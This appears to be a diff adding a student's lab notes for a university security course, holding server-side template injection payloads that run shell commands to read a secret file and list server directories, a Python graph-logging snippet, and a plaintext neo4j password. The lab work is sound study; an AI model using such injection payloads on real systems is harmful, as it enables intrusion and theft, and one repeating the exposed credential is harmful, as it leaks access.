@@ -1,0 +1,25 @@
+Task: 1
+1.{{`cat /tmp/secret_1.txt`}}
+2.{{`find / -iname '2fc1c0beb992cd7096975cfebf9d5c3b'`}}
+3. {{`ls /cs6264clients/2fc1c0beb992cd7096975cfebf9d5c3b/templates`}}
+4. python3 auditor.py --init-page=http://cs6264.gtisc.gatech.edu:60903 or 43661
+
+
+
+Task: 2
+
+frame_node = Handler.frame_id_map.get(frame_id)
+        if frame_node:
+
+            download_edge = frame_node.add_edge(file_node, EdgeType.download, {})
+
+            self._add_neo4j_msg(LoggerFile.FileNode, file_node.to_json())
+            self._add_neo4j_msg(LoggerFile.FrameEdge, download_edge)
+            
+            self.log_node(file_node)
+            self.log_edge(download_edge)
+        else:
+            logger.warning(f"Frame ID {frame_id} not found.")
+
+user: neo4j
+pwd: o3CXgF9j5S5BZZjXGaf--BqJL0zmwrIjZVALilKXPzc
